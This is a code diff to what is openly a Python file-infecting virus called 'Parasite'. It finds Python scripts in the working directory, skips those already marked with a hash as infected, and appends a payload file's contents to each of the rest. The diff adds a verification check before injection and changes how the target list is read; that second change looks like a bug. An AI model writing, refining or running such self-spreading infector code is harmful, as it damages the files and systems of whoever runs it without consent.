@@ -32,11 +32,11 @@ class IdentifyTarget:
             return False
         except FileNotFoundError: raise FileNotFoundError(f"File {self.file} not found.")
     
-    def run(self):
+    def is_verified(self):
         ''' Runs is_script and is_infected, only returns 1 if is_script and not is_infected. '''
         if self.is_script() and not self.is_infected():  
             return 1
-        print("Verification failed\nQuitting...") 
+        print(f"Verification of {self.file} failed.\nQuitting...") 
         return 0
 
 
@@ -67,8 +67,12 @@ class Parasite:
     def inject(self, file=None):
         ''' Injects the payload into the target file. '''
         if file is None: file = self.target_file
+        verified = IdentifyTarget(file).is_verified()
+        if not verified: return 1
+        print(f"Injecting {file}...\n")
         FileOperations.append_to(file, f"\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\n")
         FileOperations.append_to(file, FileOperations.read(self.payload_file))  
+        return 0
 
     def inject_all(self):
         '''
@@ -79,7 +83,9 @@ class Parasite:
         '''
         self.getPyFiles()
 
-        cwd_targets = FileOperations.read(self.output_path)
+        cwd_targets = FileOperations.read(self.output_path).split("\n").pop()
+        print(cwd_targets)
+        
         for py_file in cwd_targets:
             if py_file != "Parasite.py":
                 self.inject(py_file)
